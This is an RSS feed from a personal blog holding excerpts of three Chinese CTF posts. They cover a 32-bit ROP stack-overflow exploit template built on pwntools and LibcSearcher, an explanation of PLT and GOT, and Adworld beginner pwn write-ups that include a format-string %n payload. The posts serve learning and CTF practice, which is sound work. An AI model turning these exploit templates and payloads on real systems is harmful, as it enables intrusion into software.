<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on My New Hugo Site</title>
    <link>https://shaodongshi.github.io/posts/</link>
    <description>Recent content in Posts on My New Hugo Site</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 11 Jul 2021 17:26:35 +0800</lastBuildDate><atom:link href="https://shaodongshi.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>32位栈溢出rop模板</title>
      <link>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</link>
      <pubDate>Sun, 11 Jul 2021 17:26:35 +0800</pubDate>
      
      <guid>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</guid>
      <description>32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; process_name = &amp;#39;./&amp;#39; #p = process([process_name], env={&amp;#39;LD_LIBRARY_PATH&amp;#39;:&amp;#39;./&amp;#39;}) p = remote(&amp;#39;&amp;#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &amp;#39;A&amp;#39;*(偏移) + payload p.sendlineafter(&amp;#39;&amp;#39;, payload) main_addr = write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#34;write&amp;#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&amp;#34;write_addr =&amp;gt; %#x&amp;#34;, write_addr) libc = LibcSearcher(&amp;#39;write&amp;#39;, write_addr) libc_base = write_addr - libc.</description>
    </item>
    
    <item>
      <title>Plt与got</title>
      <link>https://shaodongshi.github.io/posts/plt%E4%B8%8Egot/</link>
      <pubDate>Sun, 11 Jul 2021 15:07:02 +0800</pubDate>
      
      <guid>https://shaodongshi.github.io/posts/plt%E4%B8%8Egot/</guid>
      <description>plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。
.plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。
.got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。
.plt.got 貌似没啥用。
0x2 理解 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; int main(int argc, char **argv) { puts(&amp;#34;Hello world!&amp;#34;); puts(&amp;#34;Hello CTF!&amp;#34;) exit(0); } 当调用第一次puts时，流程如下
第二次调用puts时，流程如下
0x3 总结 .plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。
.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。</description>
    </item>
    
    <item>
      <title>攻防世界WP</title>
      <link>https://shaodongshi.github.io/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/</link>
      <pubDate>Wed, 07 Jul 2021 18:14:33 +0800</pubDate>
      
      <guid>https://shaodongshi.github.io/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/</guid>
      <description>攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的
题目分析： nc链接，运行，拿到shell
解题： 1.nc链接IP（端口是空格）
2.ls查看文件，cat flag 获得flag
题目 CGfsb 题目描述： 菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用
题目分析： 1.从题目描述来看，解题的关键是prinf
2.查看文件格式，保护设置，运行一下
发现是一个32位的文件，开启了NX、Stack保护
这是程序的流程
3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下
这是一个高危漏洞！！！具体用法先放着，往下看。
看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！
而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。
4.格式化字符串漏洞的简单运用
%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表	示将0x64写入偏移10处保存的指针所指向的地址
解题： 1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量
输入aaaa，发现0x61616161（aaaa）偏移量为10
2.编写脚本
payload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里
3.运行
拿到falg
4.注：
还可以这样写payload=‘aaaa’+p32（0x0804A068）+&#39;%11$n&#39;
题目 when_did_you_born 题目描述： 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办
题目分析： 1.从描述来看，关键在于“年龄”
2.查看文件格式，保护设置，运行一下
64位，开启了stack、NX保护。
这是程序基本流程。
3.扔到IDA中看一下
答案就在这！！！
整体看一下
所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个
漏洞……
查看一下
v4下面正好是v5，那就可以直接覆盖了
解题： 解决。
题目 hello_pwn 题目描述： pwn！，segment fault! 菜鸡陷入了深思
题目分析： 1.题目描述貌似没啥用，不管了
2.查看文件，保护，运行一下
64位，开启了NX保护
就一句话……</description>
    </item>
    
  </channel>
</rss>
